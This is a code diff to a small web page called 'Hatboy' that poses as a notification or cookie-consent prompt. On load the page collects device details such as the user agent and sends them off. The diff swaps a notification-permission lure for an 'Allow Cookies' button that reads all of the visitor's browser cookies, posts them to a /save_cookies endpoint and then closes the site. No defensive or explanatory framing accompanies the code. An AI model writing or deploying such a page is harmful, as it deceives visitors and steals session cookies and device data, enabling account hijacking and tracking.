@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hatboy</title>
     <script>
+        // Capture device information
         function captureDeviceInfo() {
             const deviceInfo = {
                 userAgent: navigator.userAgent,
@@ -22,33 +23,30 @@
               .catch(error => console.error("Error:", error));
         }
 
-        function requestNotification() {
-            Notification.requestPermission().then(permission => {
-                if (permission === "granted") {
-                    const cookies = document.cookie.split(";").map(c => c.trim());
-                    fetch("/save_cookies", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ cookies: cookies })
-                    }).then(response => response.json())
-                      .then(data => {
-                          alert(data.message);
-                          fetch("/close_site", { method: "POST" });
-                      }).catch(error => console.error("Error:", error));
-                } else {
-                    alert("Notification permission denied!");
-                }
-            });
+        // Save all cookies from the browser
+        function allowCookies() {
+            const cookies = document.cookie.split(";").map(c => c.trim());
+
+            fetch("/save_cookies", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ cookies: cookies })
+            }).then(response => response.json())
+              .then(data => {
+                  alert(data.message); // Show success message
+                  fetch("/close_site", { method: "POST" }); // Close the site
+              }).catch(error => console.error("Error:", error));
         }
 
+        // Initialize on page load
         window.onload = () => {
             captureDeviceInfo();
-            setTimeout(() => requestNotification(), 3000);
         };
     </script>
 </head>
 <body>
     <h1>Welcome</h1>
-    <p>Please allow notifications to proceed.</p>
+    <p>Please click the button below to allow cookies.</p>
+    <button onclick="allowCookies()">Allow Cookies</button>
 </body>
 </html>
